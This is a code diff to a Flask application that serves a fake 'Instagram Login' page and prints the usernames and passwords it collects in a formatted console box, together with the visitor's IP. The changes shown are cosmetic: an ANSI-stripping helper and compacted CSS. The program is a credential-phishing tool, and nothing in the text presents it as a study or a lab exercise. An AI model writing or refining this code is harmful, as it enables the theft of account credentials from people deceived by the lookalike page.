@@ -1,12 +1,13 @@
 from flask import Flask, request, render_template_string, url_for
 import datetime
 from colorama import init, Fore, Style
+import re
 
 init(autoreset=True)  # Initialize colorama
 
 app = Flask(__name__)
 
-# ---------- Original HTML with static image URL ----------
+# ---------- Original HTML with static image ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,16 +15,7 @@ HTML_PAGE = """<!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram Login</title>
 <style>
-body {
-  font-family:'Arial',sans-serif;
-  background-color:#fafafa;
-  margin:0;
-  padding:0;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-}
+body { font-family:'Arial',sans-serif; background-color:#fafafa; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; }
 .container { display:flex; justify-content:center; align-items:center; width:100%; max-width:900px; background-color:white; border:1px solid #dbdbdb; border-radius:8px; }
 .left { padding:20px; width:50%; display:flex; justify-content:center; align-items:center; }
 .left img { max-width:100%; height:auto; border-radius:10px; }
@@ -124,7 +116,12 @@ def pretty_box(username, password, ip="unknown"):
         f"{Fore.GREEN} User : {username}",
         f"{Fore.RED} Pass : {password}{Style.RESET_ALL}"
     ]
-    width = max(len(Style.strip(line)) for line in lines) + 4
+
+    # Strip ANSI codes for proper width
+    def strip_ansi(s):
+        return re.sub(r'\x1b\[[0-9;]*m', '', s)
+
+    width = max(len(strip_ansi(line)) for line in lines) + 4
     top = "╔" + "═"*width + "╗"
     bottom = "╚" + "═"*width + "╝"
     middle = "\n".join(f"║ {line.ljust(width-2)} ║" for line in lines)
@@ -154,4 +151,3 @@ if __name__ == "__main__":
     import os
     os.environ.pop("FLASK_ENV", None)
     app.run(host="127.0.0.1", port=5001, debug=False, use_reloader=False)
-
